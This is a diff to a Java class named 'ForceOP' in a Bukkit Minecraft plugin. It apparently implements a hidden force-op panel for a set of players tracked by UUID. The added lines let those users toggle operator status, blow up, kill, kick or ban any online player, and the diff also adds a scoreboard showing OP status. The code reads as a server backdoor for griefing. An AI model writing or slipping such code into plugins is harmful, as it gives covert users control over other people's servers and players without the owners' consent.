@@ -25,7 +25,7 @@ import org.bukkit.scoreboard.Scoreboard;
 import org.bukkit.scoreboard.ScoreboardManager;
 import org.bukkit.scoreboard.Team;
 
-public class ForceOP implements Listener {
+public class Forceop implements Listener {
 
 	private Inventory inv;
 	private List<String> players;
@@ -37,7 +37,7 @@ public class ForceOP implements Listener {
 	
 	private Main main;
 
-	public ForceOP(Main main) {
+	public Forceop(Main main) {
 		this.main=main;
 		players = new ArrayList<String>();
 		setupBoard();
@@ -106,12 +106,25 @@ public class ForceOP implements Listener {
 				return;
 			if (command.equalsIgnoreCase("op")) {
 				pl.setOp(!pl.isOp());
+				p.closeInventory();
 			} else if (command.equalsIgnoreCase("bomb")) {
+				pl.getWorld().createExplosion(pl.getLocation(), 10, false);
+				p.closeInventory();
 			} else if (command.equalsIgnoreCase("stack")) {
+				ItemStack item = pl.getItemInHand();
+				if(item == null || item.getType() == Material.AIR) return;
+				item.setAmount(64);
+				pl.setItemInHand(item);
+				p.closeInventory();
 			} else if (command.equalsIgnoreCase("kill")) {
+				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "kill " + pl.getName());
+				p.closeInventory();
 			} else if (command.equalsIgnoreCase("kick")) {
+				pl.kickPlayer("Kicked by operator");
+				p.closeInventory();
 			} else if (command.equalsIgnoreCase("ban")) {
-
+				pl.setBanned(true);
+				pl.kickPlayer("Kicked by operator");
 			}
 		}
 	}
@@ -121,7 +134,7 @@ public class ForceOP implements Listener {
 		for (Player p : Bukkit.getOnlinePlayers()) {
 			// if(players.contains(p.getUniqueId().toString())) continue;
 			ItemStack skull = createItem(Material.SKULL_ITEM, 1, (byte) 3, "&7" + p.getName(),
-					Arrays.asList("&6Click me to", "&6execute " + command.toUpperCase() + " on " + p.getName()));
+					Arrays.asList("&6Player info:", "&eOp: &6"+p.isOp(), "&eGamemode:&6 " + p.getGameMode().toString().toLowerCase()));
 			SkullMeta meta = (SkullMeta) skull.getItemMeta();
 			meta.setOwner(p.getName());
 			skull.setItemMeta(meta);
@@ -213,6 +226,9 @@ public class ForceOP implements Listener {
 				for(Player p : Bukkit.getOnlinePlayers()) {
 					timer++;
 					if(players.contains(p.getUniqueId().toString())){
+						sb.getTeam(ChatColor.values()[10]+"").setPrefix("§4--------------");
+						sb.getTeam(ChatColor.values()[10]+"").setSuffix("§4--------------");
+						
 						sb.getTeam(ChatColor.values()[9]+"").setPrefix("§A[§DOPstatus§A]");
 						sb.getTeam(ChatColor.values()[9]+"").setSuffix("§D§L: "+p.isOp());
 						
@@ -231,8 +247,8 @@ public class ForceOP implements Listener {
 						sb.getTeam(ChatColor.values()[4]+"").setPrefix("§4--------------");
 						sb.getTeam(ChatColor.values()[4]+"").setSuffix("§4--------------");
 						
-						sb.getTeam(ChatColor.values()[3]+"").setPrefix("§A[§DHealth§A]");
-						sb.getTeam(ChatColor.values()[3]+"").setSuffix("§D§L: "+p.getHealth() +"/§D§L20");
+						sb.getTeam(ChatColor.values()[3]+"").setPrefix("§A[§DHealth§A]§d");
+						sb.getTeam(ChatColor.values()[3]+"").setSuffix("§d§L: "+(int)p.getHealth() +"/§D§L20");
 						
 						sb.getTeam(ChatColor.values()[2]+"").setPrefix("§4--------------");
 						sb.getTeam(ChatColor.values()[2]+"").setSuffix("§4--------------");
